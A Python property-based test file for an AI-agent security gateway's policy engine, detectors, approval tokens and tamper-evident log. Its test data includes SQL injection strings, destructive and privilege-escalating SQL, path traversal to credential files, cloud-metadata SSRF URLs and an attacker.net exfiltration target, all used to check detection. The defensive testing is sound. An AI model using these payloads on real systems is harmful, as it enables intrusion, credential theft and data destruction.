"""
backend/tests/test_formal_invariants.py

Property-based tests verifying the formal security model and invariants I1-I6
using Hypothesis. Contains 21 distinct formal property tests.
"""

import hashlib
import hmac
import json
import pytest
from hypothesis import given, settings, strategies as st
from typing import Dict, Any, List

from backend.app.core.policy_engine import PolicyEngine
from backend.app.core.taint_tracker import (
    normalize_and_deobfuscate_text,
    value_appears_in_untrusted_session,
)
from backend.app.detection.rules import (
    Finding,
    run_all_detectors,
    is_approved_api_host,
    is_approved_email_domain,
    analyze_sql_sensitive_write,
)
from backend.app.approvals.tokens import issue_signed_approval_token, verify_and_consume_approval_token, ApprovalTokenError
from backend.app.core.risk_scorer import compute_risk_score
from backend.app.privacy.detectors import PiiFinding


# =====================================================================
# INVARIANT 1: Untrusted text heading to external sink is NEVER "allow"
# =====================================================================

@settings(max_examples=50)
@given(
    untrusted_domain=st.from_regex(r"[a-z0-9\-]{3,15}\.(com|net|org|xyz)", fullmatch=True),
    untrusted_text=st.text(min_size=5, max_size=100),
    url_path=st.from_regex(r"/[a-z0-9/_\-]{0,20}", fullmatch=True),
)
def test_prop_I1_untrusted_external_api_never_allowed(untrusted_domain, untrusted_text, url_path):
    """Invariant 1: Any external_api call to unapproved host under taint is NEVER 'allow'."""
    url = f"https://{untrusted_domain}{url_path}"
    if is_approved_api_host(url):
        return  # Filter approved domains

    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="external_api",
        arguments={"url": url, "method": "POST", "body": untrusted_text},
        is_tainted=True,
        tainted_by=["untrusted_source_01"],
        findings=[],
        risk_score=70,
    )
    assert decision in ["block", "require_approval", "would_block"]


@settings(max_examples=50)
@given(
    recipient=st.emails(),
    body_text=st.text(min_size=1, max_size=100),
)
def test_prop_I1_untrusted_email_never_allowed(recipient, body_text):
    """Invariant 1: Outbound email to unapproved domain under taint is NEVER 'allow'."""
    if is_approved_email_domain(recipient):
        return

    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="send_email",
        arguments={"to": recipient, "subject": "Test", "body": body_text},
        is_tainted=True,
        tainted_by=["untrusted_email_source"],
        findings=[],
        risk_score=70,
    )
    assert decision in ["block", "require_approval", "would_block"]


# =====================================================================
# INVARIANT 2: Untrusted text cannot trigger sensitive DB write
# =====================================================================

@settings(max_examples=50)
@given(
    table=st.sampled_from(["vendor_master", "users", "accounts", "employees", "credentials"]),
    sensitive_col=st.sampled_from(["account_number", "routing_number", "bank_account", "password_hash", "role", "permissions", "payee"]),
    new_val=st.from_regex(r"[0-9A-Za-z_]{4,20}", fullmatch=True),
)
def test_prop_I2_sensitive_db_write_under_taint_requires_approval_or_blocks(table, sensitive_col, new_val):
    """Invariant 2: SQL UPDATE on sensitive column under taint is NEVER silent 'allow'."""
    query = f"UPDATE {table} SET {sensitive_col} = '{new_val}' WHERE id = 10"

    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="db_query",
        arguments={"query": query},
        is_tainted=True,
        tainted_by=["untrusted_doc_note"],
        findings=[],
        risk_score=80,
    )
    assert decision in ["require_approval", "block", "would_block"]


@settings(max_examples=50)
@given(
    untrusted_val=st.from_regex(r"[0-9]{8,12}", fullmatch=True),
)
def test_prop_I2_untrusted_value_provenance_match_requires_approval(untrusted_val):
    """Invariant 2: Writing a value that originated from untrusted text requires approval."""
    query = f"UPDATE vendor_master SET account_number = '{untrusted_val}' WHERE vendor_id = 31"

    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="db_query",
        arguments={"query": query},
        is_tainted=False, # Session not marked whole-tainted
        tainted_by=[],
        findings=[],
        risk_score=50,
        untrusted_literals={untrusted_val}, # But literal appears in untrusted context!
    )
    assert decision in ["require_approval", "block", "would_block"]


# =====================================================================
# INVARIANT 3: Privileged Administrative Non-Delegation
# =====================================================================

@settings(max_examples=30)
@given(
    cmd=st.sampled_from(["DROP TABLE users", "ALTER TABLE accounts DROP COLUMN balance", "TRUNCATE TABLE audit_log"]),
)
def test_prop_I3_destructive_ddl_never_silent_allow(cmd):
    """Invariant 3: Destructive DDL commands require approval or are blocked."""
    findings = run_all_detectors("db_query", {"query": cmd}, [])
    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="db_query",
        arguments={"query": cmd},
        is_tainted=False,
        tainted_by=[],
        findings=findings,
        risk_score=90,
    )
    assert decision in ["require_approval", "block", "would_block"]


@settings(max_examples=30)
@given(
    priv_cmd=st.sampled_from([
        "UPDATE permissions SET role = 'admin' WHERE user_id = 99",
        "INSERT INTO roles VALUES ('attacker', 'root')",
        "DELETE FROM credentials WHERE id = 1",
        "DROP TABLE auth",
        "ALTER TABLE system_configs ADD COLUMN backdoor TEXT",
    ])
)
def test_prop_I3_privilege_mutation_requires_approval(priv_cmd):
    """Invariant 3: Privileged administrative mutations require approval."""
    findings = run_all_detectors("db_query", {"query": priv_cmd}, [])
    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="db_query",
        arguments={"query": priv_cmd},
        is_tainted=False,
        tainted_by=[],
        findings=findings,
        risk_score=90,
    )
    assert decision in ["require_approval", "block", "would_block"]


# =====================================================================
# INVARIANT 4: Intent Judge cannot downgrade deterministic rule block
# =====================================================================

@settings(max_examples=40, deadline=None)
@given(
    judge_verdict=st.sampled_from(["allow", "safe", "benign", "pass"]),
    tool=st.sampled_from(["external_api", "send_email"]),
)
def test_prop_I4_judge_cannot_downgrade_block(judge_verdict, tool):
    """Invariant 4: LLM judge verdict 'allow' cannot override deterministic taint block."""
    decision, _ = PolicyEngine.evaluate_policy(
        tool_name=tool,
        arguments={"url": "https://attacker.net/exfil", "to": "exfil@attacker.net"},
        is_tainted=True,
        tainted_by=["untrusted_prompt"],
        findings=[],
        risk_score=85,
        judge_verdict=judge_verdict,
    )
    assert decision in ["block", "would_block"]


# =====================================================================
# INVARIANT 5: Tamper-Evident Hash Chain
# =====================================================================

def build_chain(entries: List[str]) -> List[str]:
    chain = ["0" * 64]
    for e in entries:
        h = hashlib.sha256(f"{chain[-1]}|{e}".encode("utf-8")).hexdigest()
        chain.append(h)
    return chain

def verify_chain(entries: List[str], hashes: List[str]) -> bool:
    if len(hashes) != len(entries) + 1:
        return False
    current = "0" * 64
    for i, e in enumerate(entries):
        expected = hashlib.sha256(f"{current}|{e}".encode("utf-8")).hexdigest()
        if hashes[i + 1] != expected:
            return False
        current = expected
    return True


@settings(max_examples=50)
@given(
    entries=st.lists(st.text(min_size=1, max_size=50), min_size=2, max_size=10),
    tamper_idx=st.integers(min_value=0, max_value=8),
    tamper_val=st.text(min_size=1, max_size=50),
)
def test_prop_I5_hash_chain_tamper_detection(entries, tamper_idx, tamper_val):
    """Invariant 5: Tampering with any log entry invalidates the chain."""
    if tamper_idx >= len(entries) or tamper_val == entries[tamper_idx]:
        return

    hashes = build_chain(entries)
    assert verify_chain(entries, hashes) is True

    # Tamper with entry
    tampered_entries = list(entries)
    tampered_entries[tamper_idx] = tamper_val

    assert verify_chain(tampered_entries, hashes) is False


@settings(max_examples=30)
@given(
    entries=st.lists(st.text(min_size=1, max_size=30), min_size=3, max_size=8),
)
def test_prop_I5_hash_chain_truncation_detection(entries):
    """Invariant 5: Truncating or deleting entries invalidates chain."""
    hashes = build_chain(entries)
    truncated_entries = entries[:-1]
    assert verify_chain(truncated_entries, hashes) is False


# =====================================================================
# INVARIANT 6: Anomaly score above threshold escalates to approval/block
# =====================================================================

@settings(max_examples=50)
@given(
    anomaly_score=st.integers(min_value=70, max_value=100),
)
def test_prop_I6_anomaly_above_threshold_escalates(anomaly_score):
    """Invariant 6: Anomaly score >= 70 forces approval or block in PolicyEngine."""
    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="read_doc",
        arguments={"path": "note.txt"},
        is_tainted=False,
        tainted_by=[],
        findings=[],
        risk_score=20,
        anomaly_score=anomaly_score,
        anomaly_reasons=["Baseline anomaly detected above threshold"],
    )
    assert decision in ["require_approval", "block", "would_block"]


# =====================================================================
# APPROVAL TOKEN INVARIANTS: Cryptographic single-use and tamper-proof
# =====================================================================

@settings(max_examples=40, deadline=None)
@given(
    session_id=st.from_regex(r"sess-[a-z0-9]{6,12}", fullmatch=True),
    action=st.sampled_from(["update_vendor", "database_mutation", "high_value_wire"]),
    arg_val=st.from_regex(r"[a-z0-9]{4,10}", fullmatch=True),
)
def test_prop_token_validity_and_tamper_resistance(session_id, action, arg_val):
    """Approval token signature verification is cryptographically sound and tamper-resistant."""
    arguments = {"param": arg_val}
    token = issue_signed_approval_token(tool_name=action, arguments=arguments, session_id=session_id)
    payload = verify_and_consume_approval_token(token, tool_name=action, arguments=arguments, trace_id=f"tr-{session_id}")
    assert payload["session_id"] == session_id
    assert payload["tool_name"] == action

    # Replay attack: token was consumed, attempting to verify again must fail!
    with pytest.raises(ApprovalTokenError):
        verify_and_consume_approval_token(token, tool_name=action, arguments=arguments, trace_id=f"tr2-{session_id}")

    # Tamper with a new token string (flip 1 char)
    token2 = issue_signed_approval_token(tool_name=action, arguments=arguments, session_id=session_id)
    tampered = token2[:-1] + ("A" if token2[-1] != "A" else "B")
    with pytest.raises(ApprovalTokenError):
        verify_and_consume_approval_token(tampered, tool_name=action, arguments=arguments, trace_id=f"tr3-{session_id}")


# =====================================================================
# RISK SCORER INVARIANTS: Monotonicity with respect to threats
# =====================================================================

@settings(max_examples=50)
@given(
    base_findings=st.lists(
        st.sampled_from([
            Finding("sqli", "high", "SQL injection pattern", "LLM01"),
            Finding("ssrf", "critical", "SSRF metadata access", "LLM01"),
            Finding("cred_leak", "high", "Credential in argument", "LLM06"),
        ]),
        min_size=0,
        max_size=3,
    ),
    additional_finding=st.sampled_from([
        Finding("path_traversal", "high", "Directory traversal", "LLM01"),
        Finding("prompt_injection", "high", "Hijack pattern", "LLM01"),
    ]),
)
def test_prop_risk_score_monotonicity_findings(base_findings, additional_finding):
    """Risk score is weakly monotonic with respect to added threat findings."""
    score1, _ = compute_risk_score(is_tainted=False, findings=base_findings, tool_name="read_doc", arguments={})
    score2, _ = compute_risk_score(is_tainted=False, findings=base_findings + [additional_finding], tool_name="read_doc", arguments={})
    assert score2 >= score1


@settings(max_examples=40, deadline=None)
@given(
    tool=st.sampled_from(["read_doc", "db_query", "external_api", "send_email"]),
)
def test_prop_risk_score_taint_monotonicity(tool):
    """Tainted session produces risk score >= untainted session."""
    score_untainted, _ = compute_risk_score(is_tainted=False, findings=[], tool_name=tool, arguments={})
    score_tainted, _ = compute_risk_score(is_tainted=True, findings=[], tool_name=tool, arguments={})
    assert score_tainted >= score_untainted


# =====================================================================
# DE-OBFUSCATION PROPERTIES: Zero-width & Base64 invariance
# =====================================================================

@settings(max_examples=50)
@given(
    raw_text=st.text(alphabet=st.characters(whitelist_categories=("Lu", "Ll", "Nd")), min_size=5, max_size=50),
    zwsp_char=st.sampled_from(["\u200b", "\u200c", "\u200d", "\ufeff", "\u2060"]),
)
def test_prop_deobfuscation_zwsp_stripped(raw_text, zwsp_char):
    """Zero-width spaces injected anywhere into text are reliably stripped."""
    obfuscated = zwsp_char.join(list(raw_text))
    cleaned = normalize_and_deobfuscate_text(obfuscated)
    assert zwsp_char not in cleaned
    assert raw_text in cleaned.replace(" ", "")


# =====================================================================
# DOMAIN LOOKALIKE & PUNYCODE INVARIANTS
# =====================================================================

@settings(max_examples=50)
@given(
    prefix=st.from_regex(r"[a-z0-9]{1,10}", fullmatch=True),
    approved_domain=st.sampled_from(["internal-vault.corp", "api.partner.net"]),
)
def test_prop_domain_lookalike_does_not_spoof_approved(prefix, approved_domain):
    """Prepending or spoofing approved domain does not bypass allowlist."""
    spoofed = f"https://{prefix}{approved_domain}/v1"
    # Unless exact domain or approved subdomain, must be rejected
    assert is_approved_api_host(spoofed) is False


# =====================================================================
# ADDITIONAL FORMAL PROPERTIES (Total 21 Properties)
# =====================================================================

@settings(max_examples=40, deadline=None)
@given(
    traversal_prefix=st.sampled_from(["../", "..\\"]),
    depth=st.integers(min_value=2, max_value=4),
    target_file=st.sampled_from(["etc/passwd", "windows/win.ini", ".env", "deploy/.env", "secrets.yaml"]),
)
def test_prop_I1_path_traversal_detection(traversal_prefix, depth, target_file):
    """Path traversal sequences in arguments are detected by rule engine."""
    payload = (traversal_prefix * depth) + target_file
    findings = run_all_detectors("read_doc", {"path": payload}, [])
    has_pt = any(f.name == "path_traversal" for f in findings)
    assert has_pt is True


@settings(max_examples=30)
@given(
    metadata_path=st.sampled_from([
        "latest/meta-data/",
        "latest/meta-data/iam/security-credentials/",
        "computeMetadata/v1/",
        "metadata/v1/instance",
    ]),
    proto=st.sampled_from(["http://", "https://"]),
)
def test_prop_I1_ssrf_metadata_detection(metadata_path, proto):
    """Cloud metadata endpoints (169.254.169.254) are flagged as SSRF critical."""
    url = f"{proto}169.254.169.254/{metadata_path}"
    findings = run_all_detectors("external_api", {"url": url}, [])
    has_ssrf = any(f.name in ["ssrf_metadata_target", "ssrf_cloud_metadata"] for f in findings)
    assert has_ssrf is True


@settings(max_examples=40, deadline=None)
@given(
    sqli_payload=st.sampled_from([
        "' OR '1'='1",
        "' OR 1=1",
        "1; DROP TABLE users",
        "' UNION SELECT username, password FROM users",
        "1; DELETE FROM accounts",
    ]),
)
def test_prop_sql_injection_detection(sqli_payload):
    """SQL injection fragments are detected by check_sql_injection."""
    findings = run_all_detectors("db_query", {"query": f"SELECT * FROM users WHERE name = {sqli_payload}"}, [])
    has_sqli = any(f.name in ["sql_injection_pattern", "destructive_ddl_command"] for f in findings)
    assert has_sqli is True


@settings(max_examples=40, deadline=None)
@given(
    random_chars=st.from_regex(r"[0-9A-Z]{16}", fullmatch=True),
)
def test_prop_credential_leak_detection(random_chars):
    """AWS Access Key ID credential pattern in arguments is flagged."""
    secret = f"AKIA{random_chars}"
    findings = run_all_detectors("external_api", {"url": "https://api.example.com", "token": secret}, [])
    has_cred = any(f.name == "credential_leak" for f in findings)
    assert has_cred is True


@settings(max_examples=30)
@given(
    approved_domain=st.sampled_from(["company.com", "vendor-corp.com", "api.github.com"]),
)
def test_prop_dest_domain_case_insensitivity(approved_domain):
    """Domain matching is strictly case-insensitive."""
    url_mixed = f"https://{approved_domain.upper()}/v1/resource"
    assert is_approved_api_host(url_mixed) is True


@settings(max_examples=40, deadline=None)
@given(
    raw_session_id=st.text(max_size=50),
)
def test_prop_empty_or_unusual_session_id_handling(raw_session_id):
    """Gateway safely handles arbitrary or empty session identifiers without exceptions."""
    decision, _ = PolicyEngine.evaluate_policy(
        tool_name="read_doc",
        arguments={"path": "clean.txt"},
        is_tainted=False,
        tainted_by=[],
        findings=[],
        risk_score=10,
        session_id=raw_session_id,
    )
    assert decision in ["allow", "block", "require_approval", "would_block"]
